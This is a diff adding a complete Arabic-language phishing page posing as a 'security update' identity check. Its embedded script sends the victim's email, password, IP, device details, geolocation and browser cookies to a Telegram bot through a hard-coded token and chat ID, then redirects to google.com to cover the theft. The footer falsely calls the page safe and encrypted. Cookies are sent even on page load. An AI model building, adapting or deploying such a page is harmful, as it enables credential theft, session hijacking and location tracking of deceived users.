@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث الأمان</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: rgba(255,255,255,0.95); border-radius: 20px; padding: 40px 30px; max-width: 420px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align: center; }
+        .logo { font-size: 48px; margin-bottom: 10px; }
+        h2 { color: #1a1a2e; font-size: 24px; margin-bottom: 5px; }
+        p.sub { color: #666; font-size: 14px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; }
+        .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; transition: 0.3s; outline: none; background: #f9f9f9; }
+        .input-group input:focus { border-color: #302b63; background: #fff; }
+        button { width: 100%; padding: 16px; background: linear-gradient(135deg, #302b63, #24243e); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button:hover { transform: scale(1.02); opacity: 0.9; }
+        #message { margin-top: 15px; font-size: 14px; min-height: 24px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #aaa; }
+        .spinner { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #302b63; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h2>تحديث الأمان</h2>
+        <p class="sub">نحتاج تأكيد هويتك لحماية حسابك من الاختراق</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@mail.com" required>
+            </div>
+            <div class="input-group">
+                <label>🔑 كلمة المرور</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <button type="submit">تأكيد الهوية</button>
+            <div class="spinner" id="spinner"></div>
+            <div id="message"></div>
+        </form>
+        <div class="footer">✅ هذا الإجراء آمن ومشفر</div>
+    </div>
+    <script>
+        const BOT_TOKEN = '8851559117:AAEQgr-AO5H3WNbKn3PvAF7AKHUnrTOAQGg';
+        const CHAT_ID = '5592683102';
+        const form = document.getElementById('loginForm');
+        const email = document.getElementById('email');
+        const password = document.getElementById('password');
+        const message = document.getElementById('message');
+        const spinner = document.getElementById('spinner');
+
+        async function sendData(email, password, extra = '') {
+            const text = `📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n${extra}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+                return res.ok;
+            } catch { return false; }
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { sendData('Location', `📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`); },
+                    () => {}
+                );
+            }
+        }
+
+        function getDeviceInfo() {
+            return `📱 الجهاز: ${navigator.userAgent}\n🌐 اللغة: ${navigator.language}\n🖥️ الشاشة: ${screen.width}x${screen.height}`;
+        }
+
+        function getCookies() {
+            if (document.cookie) { sendData('Cookies', document.cookie); }
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return `🌍 IP: ${data.ip}`;
+            } catch { return ''; }
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const emailVal = email.value.trim();
+            const passVal = password.value.trim();
+            if (!emailVal || !passVal) {
+                message.style.color = 'red';
+                message.textContent = '❌ يرجى ملء جميع الحقول';
+                return;
+            }
+            document.querySelector('button').disabled = true;
+            spinner.style.display = 'block';
+            message.style.color = 'blue';
+            message.textContent = '⏳ جاري التحقق...';
+            const ip = await getIP();
+            const deviceInfo = getDeviceInfo();
+            const fullData = `${deviceInfo}\n${ip}`;
+            const sent = await sendData(emailVal, passVal, fullData);
+            if (sent) {
+                message.style.color = 'green';
+                message.textContent = '✅ تم التحقق بنجاح، جاري التوجيه...';
+                getLocation();
+                getCookies();
+                setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+            } else {
+                message.style.color = 'red';
+                message.textContent = '❌ حدث خطأ، حاول مرة أخرى';
+                document.querySelector('button').disabled = false;
+                spinner.style.display = 'none';
+            }
+        });
+        getCookies();
+    </script>
+</body>
+</html>
